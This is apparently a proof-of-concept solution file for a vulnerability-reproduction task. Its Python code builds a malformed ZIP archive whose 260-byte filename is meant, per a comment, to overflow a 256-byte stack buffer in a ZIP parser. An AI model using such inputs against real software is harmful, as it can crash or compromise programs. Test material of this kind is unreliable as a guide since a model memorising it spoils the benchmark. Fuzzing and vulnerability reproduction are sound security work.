import struct
from typing import Optional


class Solution:
    def _build_zip_with_long_filename(self, name_len: int) -> bytes:
        if name_len < 1:
            name_len = 1
        # Ensure it exceeds the vulnerable fixed-size stack buffer (256)
        if name_len <= 256:
            name_len = 260

        filename = (b"A" * name_len)

        sig_local = 0x04034B50
        sig_cdir = 0x02014B50
        sig_eocd = 0x06054B50

        version_needed = 20
        version_made_by = 20
        gp_flag = 0
        comp_method = 0  # stored
        mod_time = 0
        mod_date = 0
        crc32 = 0
        comp_size = 0
        uncomp_size = 0
        extra = b""
        comment = b""

        local_header = struct.pack(
            "<IHHHHHIIIHH",
            sig_local,
            version_needed,
            gp_flag,
            comp_method,
            mod_time,
            mod_date,
            crc32,
            comp_size,
            uncomp_size,
            len(filename),
            len(extra),
        )
        local_offset = 0
        local_part = local_header + filename + extra  # no file data

        cdir_header = struct.pack(
            "<IHHHHHIIIHHHHHII",
            sig_cdir,
            version_made_by,
            version_needed,
            gp_flag,
            comp_method,
            mod_time,
            mod_date,
            crc32,
            comp_size,
            uncomp_size,
            len(filename),
            len(extra),
            len(comment),
            0,  # disk start
            0,  # internal attrs
            0,  # external attrs
            local_offset,
        )
        cdir_part = cdir_header + filename + extra + comment

        cd_offset = len(local_part)
        cd_size = len(cdir_part)

        eocd = struct.pack(
            "<IHHHHIIH",
            sig_eocd,
            0,  # disk
            0,  # start disk
            1,  # entries on disk
            1,  # total entries
            cd_size,
            cd_offset,
            0,  # comment length
        )

        return local_part + cdir_part + eocd

    def solve(self, src_path: str) -> bytes:
        return self._build_zip_with_long_filename(260)